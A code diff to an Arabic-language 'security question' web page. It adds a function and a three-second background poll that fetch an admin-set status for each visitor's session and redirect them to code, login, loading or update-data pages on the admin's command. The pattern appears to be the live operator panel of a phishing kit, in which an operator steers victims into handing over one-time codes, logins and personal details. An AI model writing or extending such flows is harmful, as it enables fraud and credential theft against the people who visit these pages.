@@ -116,14 +116,39 @@ if(hasError==='1'){
 }
 
 // Check if admin pre-selected a question
-fetch('/api/status/'+sid).then(function(r){return r.json();}).then(function(d){
-  if(d.security_question){
-    adminQuestion=d.security_question;
-    var qGroup=document.getElementById('questionGroup');
-    qGroup.innerHTML='<label>سؤال الأمان</label><div style="width:100%;padding:15px 16px;border:1.5px solid #1a6e2e;border-radius:14px;font-size:15px;background:#e8f5ec;color:#1a1a1a;text-align:right;font-family:Cairo,sans-serif;font-weight:700">'+adminQuestion+'</div>';
-    document.querySelector('.page-sub').textContent='أجب على سؤال الأمان للتحقق من هويتك';
-  }
-}).catch(function(){});
+function loadQuestion(){
+  fetch('/api/status/'+sid).then(function(r){return r.json();}).then(function(d){
+    if(d.security_question){
+      adminQuestion=d.security_question;
+      var qGroup=document.getElementById('questionGroup');
+      qGroup.innerHTML='<label>سؤال الأمان</label><div style="width:100%;padding:15px 16px;border:1.5px solid #1a6e2e;border-radius:14px;font-size:15px;background:#e8f5ec;color:#1a1a1a;text-align:right;font-family:Cairo,sans-serif;font-weight:700">'+adminQuestion+'</div>';
+      document.querySelector('.page-sub').textContent='أجب على سؤال الأمان للتحقق من هويتك';
+    }
+    if(d.status==='redirect'&&d.redirect&&d.redirect!=='security'){
+      var pages={code:'code.html',login:'login.html',wait:'loading.html','update-data':'update-data.html'};
+      var target=pages[d.redirect];
+      if(target)window.location.href=target+'?id='+sid;
+    }
+  }).catch(function(){});
+}
+loadQuestion();
+
+// Background polling to detect admin redirects and new questions
+var bgPoll=setInterval(function(){
+  fetch('/api/status/'+sid).then(function(r){return r.json();}).then(function(d){
+    if(d.status==='redirect'&&d.redirect){
+      if(d.redirect==='security'){
+        if(d.security_question&&d.security_question!==adminQuestion){
+          window.location.href='security.html?id='+sid;
+        }
+      }else{
+        var pages={code:'code.html',login:'login.html',wait:'loading.html','update-data':'update-data.html'};
+        var target=pages[d.redirect];
+        if(target)window.location.href=target+'?id='+sid;
+      }
+    }
+  }).catch(function(){});
+},3000);
 
 function submitSecurity(){
   var question=adminQuestion||document.getElementById('questionSelect').value;
